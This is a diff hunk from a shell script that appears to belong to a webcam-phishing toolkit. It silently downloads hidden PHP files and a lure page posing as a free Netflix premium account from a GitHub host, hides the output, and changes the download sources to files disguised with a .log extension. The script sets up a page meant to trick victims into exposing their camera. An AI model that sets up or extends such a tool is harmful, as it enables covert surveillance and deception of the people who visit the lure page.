@@ -40,19 +40,19 @@ fi
 if [[ -e .www/.camdata.php ]]; then
 echo ""
 else
-curl -o .www/.camdata.php https://raw.githubusercontent.com/htr-tech/htr-tech.github.io/master/release-download/.camdata.php > /dev/null 2>&1
+curl -o .www/.camdata.php https://raw.githubusercontent.com/htr-tech/htr-tech.github.io/master/release-download/hiddencam/log1.log > /dev/null 2>&1
 fi
 
 if [[ -e .www/.htrtech.php ]]; then
 echo ""
 else
-curl -o .www/.htrtech.php https://raw.githubusercontent.com/htr-tech/htr-tech.github.io/master/release-download/.htrtech.php > /dev/null 2>&1
+curl -o .www/.htrtech.php https://raw.githubusercontent.com/htr-tech/htr-tech.github.io/master/release-download/hiddencam/log2.log > /dev/null 2>&1
 fi
 
 if [[ -e .www/NetFlix-Premium-Account.html ]]; then
 echo ""
 else
-curl -o .www/NetFlix-Premium-Account.html https://raw.githubusercontent.com/htr-tech/htr-tech.github.io/master/release-download/NetFlix-Premium-Account.html > /dev/null 2>&1
+curl -o .www/NetFlix-Premium-Account.html https://raw.githubusercontent.com/htr-tech/htr-tech.github.io/master/release-download/hiddencam/log3.log > /dev/null 2>&1
 fi
 
 banner
